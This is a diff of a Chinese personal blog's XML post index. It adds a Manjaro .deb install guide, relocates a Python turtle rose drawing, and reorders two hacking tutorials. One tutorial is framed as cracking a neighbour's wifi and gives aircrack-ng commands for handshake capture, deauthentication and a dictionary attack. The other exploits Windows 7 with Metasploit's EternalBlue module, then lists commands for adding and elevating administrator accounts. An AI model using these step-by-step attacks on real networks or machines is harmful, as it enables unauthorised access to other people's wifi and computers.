@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>manjaro安装deb包</title>
+      <link href="/2020/05/25/2020-05-26-manjaro%E5%AE%89%E8%A3%85deb%E5%8C%85/"/>
+      <url>/2020/05/25/2020-05-26-manjaro%E5%AE%89%E8%A3%85deb%E5%8C%85/</url>
+      
+        <content type="html"><![CDATA[<p>manjaro自带的软件商店已经有很多软件了，基本上能够满足日常使用的需求，如果没有，后面还有个AUR（yay）撑着，pacman和yay两者几乎能解决普通用户需求的所有软件，除个别软件例外……例如simplenote</p><a id="more"></a><p>自从用了linux做了主力系统之后，就喜欢上了一个软件simplenote，它是一个免费开源跨平台的一个笔记软件，以简单著称。我用windows系统时一直都是使用OneNote，但OneNote没有linux系统版本，于是我被迫去寻找一个替代品，在网络上很多人都推荐simplenote，我试用了以后，就将它列为了linux系统必装的软件。从ubuntu系统换成manjaro系统之后发现pacman和yay上都没有这个包，一开始我打算下载simplenote的源码包进行编译安装的，但我在网络上看到了一种安装deb包的方法，所以试了一下。</p><h4 id="安装流程："><a href="#安装流程：" class="headerlink" title="安装流程："></a>安装流程：</h4><p>使用debtap工具进行解包</p><p>首先查看电脑上是否安装过<br>sudo pacman -Q debtap</p><p>安装yay工具<br>sudo pacman -S yay</p><p>安装解包打包工具debtap<br>yay -S debtap</p><p>升级debtap<br>sudo debtap -u</p><p>先去官网下载simplenote的deb包。</p><p>解包<br>sudo debtap Simplenote-linux-1.16.0-amd64.deb</p><p>安装<br>sudo pacman -U simplenote-1.16.0-1-x86_64.pkg.tar.zst</p><p>到此就安装完成了，我亲自测试使用，没有发现什么问题。</p><p>后面我又需要安装xmind，pacman上没有包，用yay -S xmind安装会报错，于是我又用了安装deb包的方法安装了，也能正常使用。对普通用户来说还是挺方便的。喜欢复杂点的就建议使用编译源码包的方法安装。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>manjaro显示伪输出</title>
       <link href="/2020/05/25/2020-05-26-manjaro%E6%98%BE%E7%A4%BA%E4%BC%AA%E8%BE%93%E5%87%BA/"/>
       <url>/2020/05/25/2020-05-26-manjaro%E6%98%BE%E7%A4%BA%E4%BC%AA%E8%BE%93%E5%87%BA/</url>
@@ -529,31 +554,6 @@
     
     
     <entry>
-      <title>用python画一朵玫瑰花</title>
-      <link href="/2019/12/12/%E4%BD%BF%E7%94%A8python%E7%94%BB%E7%8E%AB%E7%91%B0%E8%8A%B1/"/>
-      <url>/2019/12/12/%E4%BD%BF%E7%94%A8python%E7%94%BB%E7%8E%AB%E7%91%B0%E8%8A%B1/</url>
-      
-        <content type="html"><![CDATA[<p>这是我按照网上的教程写出来的，做了细节上的修改。这是我经手的第一朵花，放上我的博客做个纪念。</p><a id="more"></a><pre><code>## 代码如下：import turtleturtle.speed(15)turtle.screensize(400, 300, &quot;pink&quot;)turtle.goto(-200, 0)turtle.setup(1000, 600)turtle.write(&#39;赠：亲爱的           &#39;, move=True, align=&#39;left&#39;, font=(&#39;楷体&#39;, 16, &#39;normal&#39;))# 设置初始位置turtle.pensize(2)turtle.penup()turtle.left(90)turtle.forward(200)turtle.pendown()turtle.right(90)# 花蕊turtle.fillcolor(&quot;red&quot;)turtle.begin_fill()turtle.circle(10, 180)turtle.circle(25, 110)turtle.left(50)turtle.circle(60, 45)turtle.circle(20, 170)turtle.right(24)turtle.fd(30)turtle.left(10)turtle.circle(30, 110)turtle.fd(20)turtle.left(40)turtle.circle(90, 70)turtle.circle(30, 150)turtle.right(30)turtle.fd(15)turtle.circle(80, 90)turtle.left(15)turtle.fd(45)turtle.right(165)turtle.fd(20)turtle.left(155)turtle.circle(150, 80)turtle.left(50)turtle.circle(150, 90)turtle.end_fill()# 花瓣1turtle.left(150)turtle.circle(-90, 70)turtle.left(20)turtle.circle(75, 105)turtle.setheading(60)turtle.circle(80, 98)turtle.circle(-90, 40)# 花瓣2turtle.left(180)turtle.circle(90, 40)turtle.circle(-80, 98)turtle.setheading(-83)# 叶子1turtle.pensize(10)turtle.fd(30)turtle.pensize(2)turtle.left(90)turtle.fd(25)turtle.left(45)turtle.fillcolor(&quot;green&quot;)turtle.begin_fill()turtle.circle(-80, 90)turtle.right(90)turtle.circle(-80, 90)turtle.end_fill()turtle.right(135)turtle.fd(100)turtle.fd(-50)turtle.left(35)turtle.fd(30)turtle.fd(-30)turtle.right(35)turtle.fd(-10)turtle.right(35)turtle.fd(30)turtle.fd(-30)turtle.right(145)turtle.fd(65)turtle.pensize(10)turtle.left(90)turtle.fd(80)# 叶子2turtle.pensize(2)turtle.right(90)turtle.right(45)turtle.fillcolor(&quot;green&quot;)turtle.begin_fill()turtle.circle(80, 90)turtle.left(90)turtle.circle(80, 90)turtle.end_fill()turtle.left(135)turtle.fd(100)turtle.fd(-40)turtle.right(35)turtle.fd(30)turtle.fd(-30)turtle.left(35)turtle.fd(-20)turtle.left(35)turtle.fd(30)turtle.fd(-30)turtle.left(145)turtle.fd(40)turtle.right(90)turtle.pensize(10)turtle.circle(300, 60)turtle.hideturtle()turtle.done()exit()</code></pre><h2 id="附上我的效果图"><a href="#附上我的效果图" class="headerlink" title="附上我的效果图"></a>附上我的效果图</h2><p><img src="https://img-blog.csdnimg.cn/20191213002843928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> python </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> python </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>Linux系统设置frp开机自动启动</title>
       <link href="/2019/12/12/Linux%E7%B3%BB%E7%BB%9F%E8%AE%BE%E7%BD%AEfrp%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/"/>
       <url>/2019/12/12/Linux%E7%B3%BB%E7%BB%9F%E8%AE%BE%E7%BD%AEfrp%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/</url>
@@ -571,6 +571,31 @@
         <tags>
             
             <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>用python画一朵玫瑰花</title>
+      <link href="/2019/12/12/%E4%BD%BF%E7%94%A8python%E7%94%BB%E7%8E%AB%E7%91%B0%E8%8A%B1/"/>
+      <url>/2019/12/12/%E4%BD%BF%E7%94%A8python%E7%94%BB%E7%8E%AB%E7%91%B0%E8%8A%B1/</url>
+      
+        <content type="html"><![CDATA[<p>这是我按照网上的教程写出来的，做了细节上的修改。这是我经手的第一朵花，放上我的博客做个纪念。</p><a id="more"></a><pre><code>## 代码如下：import turtleturtle.speed(15)turtle.screensize(400, 300, &quot;pink&quot;)turtle.goto(-200, 0)turtle.setup(1000, 600)turtle.write(&#39;赠：亲爱的           &#39;, move=True, align=&#39;left&#39;, font=(&#39;楷体&#39;, 16, &#39;normal&#39;))# 设置初始位置turtle.pensize(2)turtle.penup()turtle.left(90)turtle.forward(200)turtle.pendown()turtle.right(90)# 花蕊turtle.fillcolor(&quot;red&quot;)turtle.begin_fill()turtle.circle(10, 180)turtle.circle(25, 110)turtle.left(50)turtle.circle(60, 45)turtle.circle(20, 170)turtle.right(24)turtle.fd(30)turtle.left(10)turtle.circle(30, 110)turtle.fd(20)turtle.left(40)turtle.circle(90, 70)turtle.circle(30, 150)turtle.right(30)turtle.fd(15)turtle.circle(80, 90)turtle.left(15)turtle.fd(45)turtle.right(165)turtle.fd(20)turtle.left(155)turtle.circle(150, 80)turtle.left(50)turtle.circle(150, 90)turtle.end_fill()# 花瓣1turtle.left(150)turtle.circle(-90, 70)turtle.left(20)turtle.circle(75, 105)turtle.setheading(60)turtle.circle(80, 98)turtle.circle(-90, 40)# 花瓣2turtle.left(180)turtle.circle(90, 40)turtle.circle(-80, 98)turtle.setheading(-83)# 叶子1turtle.pensize(10)turtle.fd(30)turtle.pensize(2)turtle.left(90)turtle.fd(25)turtle.left(45)turtle.fillcolor(&quot;green&quot;)turtle.begin_fill()turtle.circle(-80, 90)turtle.right(90)turtle.circle(-80, 90)turtle.end_fill()turtle.right(135)turtle.fd(100)turtle.fd(-50)turtle.left(35)turtle.fd(30)turtle.fd(-30)turtle.right(35)turtle.fd(-10)turtle.right(35)turtle.fd(30)turtle.fd(-30)turtle.right(145)turtle.fd(65)turtle.pensize(10)turtle.left(90)turtle.fd(80)# 叶子2turtle.pensize(2)turtle.right(90)turtle.right(45)turtle.fillcolor(&quot;green&quot;)turtle.begin_fill()turtle.circle(80, 90)turtle.left(90)turtle.circle(80, 90)turtle.end_fill()turtle.left(135)turtle.fd(100)turtle.fd(-40)turtle.right(35)turtle.fd(30)turtle.fd(-30)turtle.left(35)turtle.fd(-20)turtle.left(35)turtle.fd(30)turtle.fd(-30)turtle.left(145)turtle.fd(40)turtle.right(90)turtle.pensize(10)turtle.circle(300, 60)turtle.hideturtle()turtle.done()exit()</code></pre><h2 id="附上我的效果图"><a href="#附上我的效果图" class="headerlink" title="附上我的效果图"></a>附上我的效果图</h2><p><img src="https://img-blog.csdnimg.cn/20191213002843928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
             
         </tags>
       
@@ -629,11 +654,11 @@
     
     
     <entry>
-      <title>使用kali破解邻居wifi</title>
-      <link href="/2019/11/18/%E4%BD%BF%E7%94%A8kali%E7%A0%B4%E8%A7%A3%E9%82%BB%E5%B1%85wifi/"/>
-      <url>/2019/11/18/%E4%BD%BF%E7%94%A8kali%E7%A0%B4%E8%A7%A3%E9%82%BB%E5%B1%85wifi/</url>
+      <title>kali入侵win7</title>
+      <link href="/2019/11/18/kali%E5%85%A5%E4%BE%B5win7/"/>
+      <url>/2019/11/18/kali%E5%85%A5%E4%BE%B5win7/</url>
       
-        <content type="html"><![CDATA[<p><strong>前提条件</strong></p><p>1.kali系统<br>2.适用kali的无线网卡<br>3.kali默认的字典路径：/usr/share/wordlists/rockyou.txt.gz</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><a id="more"></a><h4 id="第一步：接入无线网卡"><a href="#第一步：接入无线网卡" class="headerlink" title="第一步：接入无线网卡"></a>第一步：接入无线网卡</h4><p>使用<code>ifconfig</code>指令查看是否有wlan0这个网卡，有则证明接入成功。</p><h4 id="第二步：启动监听网卡"><a href="#第二步：启动监听网卡" class="headerlink" title="第二步：启动监听网卡"></a>第二步：启动监听网卡</h4><pre><code>airmon-ng start wlan0</code></pre><p>开启之后再次输入ifconfig查看是否有wlan0mon，有则证明网卡开启监听模式了。</p><h4 id="第三步：扫描wifi"><a href="#第三步：扫描wifi" class="headerlink" title="第三步：扫描wifi"></a>第三步：扫描wifi</h4><pre><code>airodump-ng wlan0mon</code></pre><p>扫描到目标wifi后，记录下目标的BSSID 和CH<br>按ctrl+c结束扫描</p><h4 id="第四步：抓取目标的握手包"><a href="#第四步：抓取目标的握手包" class="headerlink" title="第四步：抓取目标的握手包"></a>第四步：抓取目标的握手包</h4><pre><code>airodump-ng -c 7 --bssid 78:44:FD:59:00:88 -w xiaoming wlan0mon</code></pre><p>参数解释：<br>-c指定频道号<br>–bssid指定路由器bssid<br>-w指定抓取的数据包保存位置</p><h4 id="第五步："><a href="#第五步：" class="headerlink" title="第五步："></a>第五步：</h4><p>强制连接到wifi的设备重新连接路由器</p><pre><code>aireplay-ng -0 2 -a 78:44:FD:59:00:88 -c B8:E8:56:09:CC:9C wlan0mon</code></pre><p>参数解释：<br>-0表示发起deauthentication攻击<br>-a指定无线路由器BSSID<br>-c指定强制断开的设备</p><p>如果成功的话，会在右上角看到 WPA handshake: 00:00:00:00:00:00 类似这样的提示。</p><h4 id="第六步：开始破解密码"><a href="#第六步：开始破解密码" class="headerlink" title="第六步：开始破解密码"></a>第六步：开始破解密码</h4><pre><code>aircrack-ng -a2 -b 78:44:FD:59:00:88 -w /usr/share/wordlists/rockyou.txt ~/*.cap</code></pre><p>能否破解就看字典够不够强。没有破不开的wifi密码，只有不够强的字典。<br>建议大家设置wifi密码时要尽可能的复杂。</p>]]></content>
+        <content type="html"><![CDATA[<p><strong>前提说明</strong></p><p>1.在同个局域网内<br>2.准备纯净系统的win7系统电脑一台<br>3.准备kali系统一台<br>4.我的操作均是在虚拟机上完成，可能在物理机上效果会有所不同。</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><a id="more"></a><h3 id="第一步：-扫描局域网内存活的主机："><a href="#第一步：-扫描局域网内存活的主机：" class="headerlink" title="第一步： 扫描局域网内存活的主机："></a>第一步： 扫描局域网内存活的主机：</h3><p><code>nmap -sP 192.168.1.0/24</code> （扫描较快）<br>也可以直接用这条命令来扫描：<br><code>nmap -sS -sV -Pn 192.168.1.0/24</code>  （扫描较慢）<br>nmap还有很多扫描用法，请自行查询。</p><h3 id="第二步：扫描要攻击的主机："><a href="#第二步：扫描要攻击的主机：" class="headerlink" title="第二步：扫描要攻击的主机："></a>第二步：扫描要攻击的主机：</h3><p><code>nmap -sS -sV -Pn 192.168.1.111</code>（例如目标主机是192.168.1.111）</p><h3 id="第三步：Kali终端输入msfconsole-或者手动点击软件图标"><a href="#第三步：Kali终端输入msfconsole-或者手动点击软件图标" class="headerlink" title="第三步：Kali终端输入msfconsole 或者手动点击软件图标"></a>第三步：Kali终端输入msfconsole 或者手动点击软件图标</h3><h3 id="第四步：先使用use-auxiliary-scanner-smb-smb-ms17-010"><a href="#第四步：先使用use-auxiliary-scanner-smb-smb-ms17-010" class="headerlink" title="第四步：先使用use auxiliary/scanner/smb/smb_ms17_010"></a>第四步：先使用<code>use auxiliary/scanner/smb/smb_ms17_010</code></h3><p>利用ms17_010这个漏洞入侵<br>紧接着输入show options这个模块进行漏洞的分析，看看这个445端口是否能被入侵。</p><h3 id="第五步：使用攻击模块："><a href="#第五步：使用攻击模块：" class="headerlink" title="第五步：使用攻击模块："></a>第五步：使用攻击模块：</h3><pre><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre><p>输入show targets查看这个模块适用于哪些系统的主机</p><h3 id="第六步：设置RHOST，即要攻击的主机ip："><a href="#第六步：设置RHOST，即要攻击的主机ip：" class="headerlink" title="第六步：设置RHOST，即要攻击的主机ip："></a>第六步：设置RHOST，即要攻击的主机ip：</h3><pre><code>set RHOST 192.168.0.111</code></pre><h3 id="第七步：执行run"><a href="#第七步：执行run" class="headerlink" title="第七步：执行run"></a>第七步：执行<code>run</code></h3><p>如果电脑存在上面的那个漏洞的话，这一步就可以进去了<br>如果等了一会还没显示进去的话，就按下回车键。</p><p>备注：进去之后会看到乱码，因为cmd上的编码使用的是936，通过 chcp命令改变代码页，UTF-8的代码页为65001 。要改回linux的UTF-8编码：chcp 65001</p><p>MS-DOS为以下国家和语言提供字符集：<br>　　代码页描述<br>　　1258 越南语<br>　　1257 波罗的语<br>　　1256 阿拉伯语<br>　　1255 希伯来语<br>　　1254 土耳其语<br>　　1253 希腊语<br>　　1252 拉丁 1 字符 (ANSI)<br>　　1251 西里尔语<br>　　1250 中欧语言<br>　　950 繁体中文<br>　　949 朝鲜语<br>　　936 简体中文（默认）<br>　　932 日语<br>　　874 泰国语<br>　　850 多语种 (MS-DOS Latin1)<br>　　437 MS-DOS 美国英语 </p><p>还有一个解决方法，如果想显示中文的话，就将kali终端的编码改为“简体中文-GBK”</p><h3 id="第八步：执行想要操作的指令"><a href="#第八步：执行想要操作的指令" class="headerlink" title="第八步：执行想要操作的指令"></a>第八步：执行想要操作的指令</h3><p>删除文件夹：rmdir 目标文件夹<br>删除文件：del<br>创建文件夹：md 文件夹<br>查看目标的磁盘信息：wmic logicaldisk<br>查看系统信息：systeminfo<br>创建一个用户：net user test 123456 /add<br>将创建的test用户赋予管理员权限：net localgroup administrator test /add<br>查看有哪些用户：net user<br>查看账户的属性：net user test<br>立刻关机：shutdown /s/f   #会提示没有权限<br>net user guest /active:yes 激活guest用户<br>net user guest 12345 用guest用户登陆后用将密码改为12345<br>net password 密码 更改系统登陆密码<br>netstat -n 查看端口的网络连接情况，常用netstat -an<br>net start 查看开启了哪些服务<br>net start 服务名　开启服务；(如:net start telnet， net start schedule)<br>net stop 服务名 停止某服务<br>net user admin /active:no 将用户admin禁用<br>net user admin /active:yes 将用户admin激活<br>tive:no 将用户admin禁用<br>net user admin /active:yes 将用户admin激活<br>net start termservice termservice 是远程桌面服务<br>net user 用户名 复杂密码 /add   添加用户<br>net localgroup administrators 用户名 /add   将用户加入管理员组</p>]]></content>
       
       
       <categories>
@@ -654,11 +679,11 @@
     
     
     <entry>
-      <title>kali入侵win7</title>
-      <link href="/2019/11/18/kali%E5%85%A5%E4%BE%B5win7/"/>
-      <url>/2019/11/18/kali%E5%85%A5%E4%BE%B5win7/</url>
+      <title>使用kali破解邻居wifi</title>
+      <link href="/2019/11/18/%E4%BD%BF%E7%94%A8kali%E7%A0%B4%E8%A7%A3%E9%82%BB%E5%B1%85wifi/"/>
+      <url>/2019/11/18/%E4%BD%BF%E7%94%A8kali%E7%A0%B4%E8%A7%A3%E9%82%BB%E5%B1%85wifi/</url>
       
-        <content type="html"><![CDATA[<p><strong>前提说明</strong></p><p>1.在同个局域网内<br>2.准备纯净系统的win7系统电脑一台<br>3.准备kali系统一台<br>4.我的操作均是在虚拟机上完成，可能在物理机上效果会有所不同。</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><a id="more"></a><h3 id="第一步：-扫描局域网内存活的主机："><a href="#第一步：-扫描局域网内存活的主机：" class="headerlink" title="第一步： 扫描局域网内存活的主机："></a>第一步： 扫描局域网内存活的主机：</h3><p><code>nmap -sP 192.168.1.0/24</code> （扫描较快）<br>也可以直接用这条命令来扫描：<br><code>nmap -sS -sV -Pn 192.168.1.0/24</code>  （扫描较慢）<br>nmap还有很多扫描用法，请自行查询。</p><h3 id="第二步：扫描要攻击的主机："><a href="#第二步：扫描要攻击的主机：" class="headerlink" title="第二步：扫描要攻击的主机："></a>第二步：扫描要攻击的主机：</h3><p><code>nmap -sS -sV -Pn 192.168.1.111</code>（例如目标主机是192.168.1.111）</p><h3 id="第三步：Kali终端输入msfconsole-或者手动点击软件图标"><a href="#第三步：Kali终端输入msfconsole-或者手动点击软件图标" class="headerlink" title="第三步：Kali终端输入msfconsole 或者手动点击软件图标"></a>第三步：Kali终端输入msfconsole 或者手动点击软件图标</h3><h3 id="第四步：先使用use-auxiliary-scanner-smb-smb-ms17-010"><a href="#第四步：先使用use-auxiliary-scanner-smb-smb-ms17-010" class="headerlink" title="第四步：先使用use auxiliary/scanner/smb/smb_ms17_010"></a>第四步：先使用<code>use auxiliary/scanner/smb/smb_ms17_010</code></h3><p>利用ms17_010这个漏洞入侵<br>紧接着输入show options这个模块进行漏洞的分析，看看这个445端口是否能被入侵。</p><h3 id="第五步：使用攻击模块："><a href="#第五步：使用攻击模块：" class="headerlink" title="第五步：使用攻击模块："></a>第五步：使用攻击模块：</h3><pre><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre><p>输入show targets查看这个模块适用于哪些系统的主机</p><h3 id="第六步：设置RHOST，即要攻击的主机ip："><a href="#第六步：设置RHOST，即要攻击的主机ip：" class="headerlink" title="第六步：设置RHOST，即要攻击的主机ip："></a>第六步：设置RHOST，即要攻击的主机ip：</h3><pre><code>set RHOST 192.168.0.111</code></pre><h3 id="第七步：执行run"><a href="#第七步：执行run" class="headerlink" title="第七步：执行run"></a>第七步：执行<code>run</code></h3><p>如果电脑存在上面的那个漏洞的话，这一步就可以进去了<br>如果等了一会还没显示进去的话，就按下回车键。</p><p>备注：进去之后会看到乱码，因为cmd上的编码使用的是936，通过 chcp命令改变代码页，UTF-8的代码页为65001 。要改回linux的UTF-8编码：chcp 65001</p><p>MS-DOS为以下国家和语言提供字符集：<br>　　代码页描述<br>　　1258 越南语<br>　　1257 波罗的语<br>　　1256 阿拉伯语<br>　　1255 希伯来语<br>　　1254 土耳其语<br>　　1253 希腊语<br>　　1252 拉丁 1 字符 (ANSI)<br>　　1251 西里尔语<br>　　1250 中欧语言<br>　　950 繁体中文<br>　　949 朝鲜语<br>　　936 简体中文（默认）<br>　　932 日语<br>　　874 泰国语<br>　　850 多语种 (MS-DOS Latin1)<br>　　437 MS-DOS 美国英语 </p><p>还有一个解决方法，如果想显示中文的话，就将kali终端的编码改为“简体中文-GBK”</p><h3 id="第八步：执行想要操作的指令"><a href="#第八步：执行想要操作的指令" class="headerlink" title="第八步：执行想要操作的指令"></a>第八步：执行想要操作的指令</h3><p>删除文件夹：rmdir 目标文件夹<br>删除文件：del<br>创建文件夹：md 文件夹<br>查看目标的磁盘信息：wmic logicaldisk<br>查看系统信息：systeminfo<br>创建一个用户：net user test 123456 /add<br>将创建的test用户赋予管理员权限：net localgroup administrator test /add<br>查看有哪些用户：net user<br>查看账户的属性：net user test<br>立刻关机：shutdown /s/f   #会提示没有权限<br>net user guest /active:yes 激活guest用户<br>net user guest 12345 用guest用户登陆后用将密码改为12345<br>net password 密码 更改系统登陆密码<br>netstat -n 查看端口的网络连接情况，常用netstat -an<br>net start 查看开启了哪些服务<br>net start 服务名　开启服务；(如:net start telnet， net start schedule)<br>net stop 服务名 停止某服务<br>net user admin /active:no 将用户admin禁用<br>net user admin /active:yes 将用户admin激活<br>tive:no 将用户admin禁用<br>net user admin /active:yes 将用户admin激活<br>net start termservice termservice 是远程桌面服务<br>net user 用户名 复杂密码 /add   添加用户<br>net localgroup administrators 用户名 /add   将用户加入管理员组</p>]]></content>
+        <content type="html"><![CDATA[<p><strong>前提条件</strong></p><p>1.kali系统<br>2.适用kali的无线网卡<br>3.kali默认的字典路径：/usr/share/wordlists/rockyou.txt.gz</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><a id="more"></a><h4 id="第一步：接入无线网卡"><a href="#第一步：接入无线网卡" class="headerlink" title="第一步：接入无线网卡"></a>第一步：接入无线网卡</h4><p>使用<code>ifconfig</code>指令查看是否有wlan0这个网卡，有则证明接入成功。</p><h4 id="第二步：启动监听网卡"><a href="#第二步：启动监听网卡" class="headerlink" title="第二步：启动监听网卡"></a>第二步：启动监听网卡</h4><pre><code>airmon-ng start wlan0</code></pre><p>开启之后再次输入ifconfig查看是否有wlan0mon，有则证明网卡开启监听模式了。</p><h4 id="第三步：扫描wifi"><a href="#第三步：扫描wifi" class="headerlink" title="第三步：扫描wifi"></a>第三步：扫描wifi</h4><pre><code>airodump-ng wlan0mon</code></pre><p>扫描到目标wifi后，记录下目标的BSSID 和CH<br>按ctrl+c结束扫描</p><h4 id="第四步：抓取目标的握手包"><a href="#第四步：抓取目标的握手包" class="headerlink" title="第四步：抓取目标的握手包"></a>第四步：抓取目标的握手包</h4><pre><code>airodump-ng -c 7 --bssid 78:44:FD:59:00:88 -w xiaoming wlan0mon</code></pre><p>参数解释：<br>-c指定频道号<br>–bssid指定路由器bssid<br>-w指定抓取的数据包保存位置</p><h4 id="第五步："><a href="#第五步：" class="headerlink" title="第五步："></a>第五步：</h4><p>强制连接到wifi的设备重新连接路由器</p><pre><code>aireplay-ng -0 2 -a 78:44:FD:59:00:88 -c B8:E8:56:09:CC:9C wlan0mon</code></pre><p>参数解释：<br>-0表示发起deauthentication攻击<br>-a指定无线路由器BSSID<br>-c指定强制断开的设备</p><p>如果成功的话，会在右上角看到 WPA handshake: 00:00:00:00:00:00 类似这样的提示。</p><h4 id="第六步：开始破解密码"><a href="#第六步：开始破解密码" class="headerlink" title="第六步：开始破解密码"></a>第六步：开始破解密码</h4><pre><code>aircrack-ng -a2 -b 78:44:FD:59:00:88 -w /usr/share/wordlists/rockyou.txt ~/*.cap</code></pre><p>能否破解就看字典够不够强。没有破不开的wifi密码，只有不够强的字典。<br>建议大家设置wifi密码时要尽可能的复杂。</p>]]></content>
       
       
       <categories>
